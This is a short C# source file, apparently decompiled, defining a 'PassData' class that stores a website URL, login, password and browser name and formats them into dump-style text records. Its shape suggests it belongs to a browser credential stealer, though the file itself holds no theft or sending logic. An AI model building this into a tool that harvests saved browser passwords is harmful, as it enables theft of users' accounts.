using System;
using System.Collections.Generic;
//using System.Linq;
using System.Text;

namespace NoFile
{
    public class PassData
    {
        public string Url { get; set; }

        public string Login { get; set; }

        public string Password { get; set; }

        public string Program { get; set; }

        public override string ToString()
        {
            return string.Format("Website: {0}\r\nLogin: {1}\r\nPassword: {2}\r\nBrowser : {3}\r\n----------------------\r\n", (object)this.Url, (object)this.Login, (object)this.Password, (object)this.Program);
        }
    }
}

